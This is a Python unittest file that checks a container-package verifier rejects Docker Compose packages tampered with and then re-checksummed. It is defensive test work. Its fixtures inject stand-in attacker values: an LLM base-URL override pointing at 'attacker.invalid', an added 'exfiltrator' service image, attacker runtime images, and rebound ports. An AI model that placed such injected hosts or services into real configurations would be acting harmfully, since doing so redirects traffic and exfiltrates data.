from __future__ import annotations

import json
import tempfile
import unittest
from hashlib import sha256
from pathlib import Path

from pathfinder.simulator import (
    LocalContainerError,
    build_local_container_compose,
    build_portable_execution_plan,
    plan_container_backend,
    verify_local_container_compose,
)
from pathfinder.simulator.local_container import (
    LEGACY_LOCAL_COMPOSE_MANIFEST_SCHEMA_VERSION,
    LOCAL_COMPOSE_MANIFEST_SCHEMA_VERSION,
    PREVIOUS_LOCAL_COMPOSE_MANIFEST_SCHEMA_VERSION,
)


ROOT = Path(__file__).resolve().parents[1]
SCENARIO = ROOT / "configs" / "flowmesh_infra_simulator_4x8_smoke.json"
CONTAINER_SPEC = (
    ROOT / "configs" / "flowmesh_infra_container_4x8_contract.json"
)


def _write_json(path: Path, document: dict) -> None:
    path.write_text(
        json.dumps(
            document,
            indent=2,
            sort_keys=True,
            ensure_ascii=False,
            allow_nan=False,
        )
        + "\n",
        encoding="utf-8",
    )


def _restamp_package(package: Path) -> None:
    """Model an attacker who updates every package digest after tampering."""

    manifest_path = package / "local_container_manifest.json"
    manifest = json.loads(manifest_path.read_text(encoding="utf-8"))
    bound_names = (
        "compose.yaml",
        "container_endpoints.json",
        "container_operations.jsonl",
        "container_topology.json",
    )
    manifest["output_sha256"] = {
        name: sha256((package / name).read_bytes()).hexdigest()
        for name in bound_names
    }
    _write_json(manifest_path, manifest)

    checked_names = (*bound_names, "local_container_manifest.json")
    checksum_rows = "".join(
        f"{sha256((package / name).read_bytes()).hexdigest()}  {name}\n"
        for name in sorted(checked_names)
    )
    (package / "SHA256SUMS").write_text(checksum_rows, encoding="utf-8")


class LocalContainerEndpointVerificationTest(unittest.TestCase):
    def setUp(self) -> None:
        self.temporary = tempfile.TemporaryDirectory()
        self.addCleanup(self.temporary.cleanup)
        self.root = Path(self.temporary.name)
        portable = self.root / "portable"
        self.container_plan = self.root / "container-plan"
        build_portable_execution_plan(SCENARIO, output_dir=portable)
        plan_container_backend(
            SCENARIO,
            portable,
            CONTAINER_SPEC,
            output_dir=self.container_plan,
        )

    def _build(self, name: str) -> Path:
        output = self.root / name
        build_local_container_compose(
            self.container_plan,
            output_dir=output,
        )
        return output

    def _build_semantic(self, name: str) -> Path:
        output = self.root / name
        build_local_container_compose(
            self.container_plan,
            output_dir=output,
            semantic_executor_node_id="N6",
            semantic_artifact_source_node_ids=("N3",),
        )
        return output

    def test_rechecksummed_external_same_origin_urls_are_rejected(self) -> None:
        schemas = (
            LOCAL_COMPOSE_MANIFEST_SCHEMA_VERSION,
            PREVIOUS_LOCAL_COMPOSE_MANIFEST_SCHEMA_VERSION,
            LEGACY_LOCAL_COMPOSE_MANIFEST_SCHEMA_VERSION,
        )
        for index, schema_version in enumerate(schemas):
            with self.subTest(schema_version=schema_version):
                package = self._build(f"external-{index}")
                manifest_path = package / "local_container_manifest.json"
                manifest = json.loads(
                    manifest_path.read_text(encoding="utf-8")
                )
                manifest["schema_version"] = schema_version
                _write_json(manifest_path, manifest)

                endpoint_path = package / "container_endpoints.json"
                endpoints = json.loads(
                    endpoint_path.read_text(encoding="utf-8")
                )
                endpoint = endpoints["endpoints"]["N1"]
                endpoint["host_health_url"] = (
                    "https://same-origin.invalid/healthz"
                )
                endpoint["host_operation_url"] = (
                    "https://same-origin.invalid/v1/operations/execute"
                )
                endpoint["host_semantic_url"] = (
                    "https://same-origin.invalid/v1/semantic/chat-completions"
                )
                _write_json(endpoint_path, endpoints)
                _restamp_package(package)

                with self.assertRaisesRegex(
                    LocalContainerError,
                    "bad host health endpoint for N1",
                ):
                    verify_local_container_compose(package)

    def test_rechecksummed_compose_port_rebinding_is_rejected(self) -> None:
        package = self._build("port-rebinding")
        compose_path = package / "compose.yaml"
        compose = compose_path.read_text(encoding="utf-8")
        expected = '      - "127.0.0.1:19081:9080"'
        replacement = '      - "127.0.0.1:29999:9080"'
        self.assertEqual(compose.count(expected), 1)
        compose_path.write_text(
            compose.replace(expected, replacement),
            encoding="utf-8",
        )
        _restamp_package(package)

        with self.assertRaisesRegex(
            LocalContainerError,
            "bad Compose host port binding for N1",
        ):
            verify_local_container_compose(package)

    def test_current_manifest_requires_host_port_base(self) -> None:
        package = self._build("missing-current-port-base")
        manifest_path = package / "local_container_manifest.json"
        manifest = json.loads(manifest_path.read_text(encoding="utf-8"))
        manifest.pop("host_port_base")
        _write_json(manifest_path, manifest)
        _restamp_package(package)

        with self.assertRaisesRegex(
            LocalContainerError,
            "current local Compose manifest is missing host_port_base",
        ):
            verify_local_container_compose(package)

    def test_legacy_manifest_without_host_port_base_remains_readable(self) -> None:
        package = self._build("legacy-without-port-base")
        manifest_path = package / "local_container_manifest.json"
        manifest = json.loads(manifest_path.read_text(encoding="utf-8"))
        manifest["schema_version"] = (
            LEGACY_LOCAL_COMPOSE_MANIFEST_SCHEMA_VERSION
        )
        manifest.pop("host_port_base")
        _write_json(manifest_path, manifest)
        _restamp_package(package)

        verified = verify_local_container_compose(package)
        self.assertEqual("VERIFIED_NOT_LAUNCHED", verified["status"])

    def test_legacy_semantic_manifest_cannot_remove_host_port_binding(self) -> None:
        schemas = (
            PREVIOUS_LOCAL_COMPOSE_MANIFEST_SCHEMA_VERSION,
            LEGACY_LOCAL_COMPOSE_MANIFEST_SCHEMA_VERSION,
        )
        for index, schema_version in enumerate(schemas):
            with self.subTest(schema_version=schema_version):
                package = self._build_semantic(f"semantic-downgrade-{index}")
                manifest_path = package / "local_container_manifest.json"
                manifest = json.loads(
                    manifest_path.read_text(encoding="utf-8")
                )
                manifest["schema_version"] = schema_version
                manifest.pop("host_port_base")
                _write_json(manifest_path, manifest)

                endpoint_path = package / "container_endpoints.json"
                endpoints = json.loads(
                    endpoint_path.read_text(encoding="utf-8")
                )
                semantic_endpoint = endpoints["endpoints"]["N6"]
                semantic_endpoint["host_health_url"] = (
                    "https://same-origin.invalid/healthz"
                )
                semantic_endpoint["host_operation_url"] = (
                    "https://same-origin.invalid/v1/operations/execute"
                )
                semantic_endpoint["host_semantic_url"] = (
                    "https://same-origin.invalid/v1/semantic/chat-completions"
                )
                _write_json(endpoint_path, endpoints)
                _restamp_package(package)

                with self.assertRaisesRegex(
                    LocalContainerError,
                    "semantic-enabled local Compose manifest is missing "
                    "host_port_base",
                ):
                    verify_local_container_compose(package)

    def test_clean_semantic_package_returns_verified_loopback_endpoint(self) -> None:
        package = self._build_semantic("verified-semantic-endpoint")

        verified = verify_local_container_compose(package)

        self.assertEqual(
            {
                "host_health_url": "http://127.0.0.1:19086/healthz",
                "host_semantic_url": (
                    "http://127.0.0.1:19086/v1/semantic/chat-completions"
                ),
            },
            verified["verified_semantic_endpoint"],
        )

    def test_rechecksummed_semantic_environment_override_is_rejected(self) -> None:
        package = self._build_semantic("semantic-environment-override")
        compose_path = package / "compose.yaml"
        compose = compose_path.read_text(encoding="utf-8")
        passthrough = "      - PATHFINDER_SEMANTIC_LLM_BASE_URL"
        self.assertEqual(compose.count(passthrough), 1)
        compose_path.write_text(
            compose.replace(
                passthrough,
                passthrough
                + "\n      - PATHFINDER_SEMANTIC_LLM_BASE_URL="
                + "https://attacker.invalid/v1",
            ),
            encoding="utf-8",
        )
        _restamp_package(package)

        with self.assertRaisesRegex(
            LocalContainerError,
            "semantic Compose document differs from deterministic output",
        ):
            verify_local_container_compose(package)

    def test_rechecksummed_semantic_extra_service_is_rejected(self) -> None:
        package = self._build_semantic("semantic-extra-service")
        compose_path = package / "compose.yaml"
        compose = compose_path.read_text(encoding="utf-8")
        marker = "networks:\n  pathfinder-infra:"
        self.assertEqual(compose.count(marker), 1)
        compose_path.write_text(
            compose.replace(
                marker,
                (
                    "  exfiltrator:\n"
                    "    image: \"attacker.invalid/exfiltrator:latest\"\n"
                    + marker
                ),
            ),
            encoding="utf-8",
        )
        _restamp_package(package)

        with self.assertRaisesRegex(
            LocalContainerError,
            "semantic Compose document differs from deterministic output",
        ):
            verify_local_container_compose(package)

    def test_schema_downgrade_cannot_bypass_semantic_exactness(self) -> None:
        package = self._build_semantic("semantic-schema-downgrade")
        manifest_path = package / "local_container_manifest.json"
        manifest = json.loads(manifest_path.read_text(encoding="utf-8"))
        manifest["schema_version"] = PREVIOUS_LOCAL_COMPOSE_MANIFEST_SCHEMA_VERSION
        _write_json(manifest_path, manifest)

        compose_path = package / "compose.yaml"
        compose = compose_path.read_text(encoding="utf-8")
        passthrough = "      - PATHFINDER_SEMANTIC_LLM_BASE_URL"
        compose_path.write_text(
            compose.replace(
                passthrough,
                passthrough
                + "\n      - PATHFINDER_SEMANTIC_LLM_BASE_URL="
                + "https://attacker.invalid/v1",
            ),
            encoding="utf-8",
        )
        _restamp_package(package)

        with self.assertRaisesRegex(
            LocalContainerError,
            "semantic-enabled local Compose package must use the current schema",
        ):
            verify_local_container_compose(package)

    def test_current_semantic_runtime_flags_cannot_be_downgraded(self) -> None:
        cases = (
            (
                "semantic_runtime_build",
                False,
                "semantic runtime build flag differs from semantic quality",
            ),
            (
                "semantic_runtime_image",
                "attacker.invalid/pathfinder:latest",
                "semantic runtime image differs from semantic quality",
            ),
        )
        for index, (field, value, message) in enumerate(cases):
            with self.subTest(field=field):
                package = self._build_semantic(f"semantic-runtime-{index}")
                manifest_path = package / "local_container_manifest.json"
                manifest = json.loads(
                    manifest_path.read_text(encoding="utf-8")
                )
                manifest[field] = value
                _write_json(manifest_path, manifest)
                _restamp_package(package)

                with self.assertRaisesRegex(LocalContainerError, message):
                    verify_local_container_compose(package)


if __name__ == "__main__":
    unittest.main()
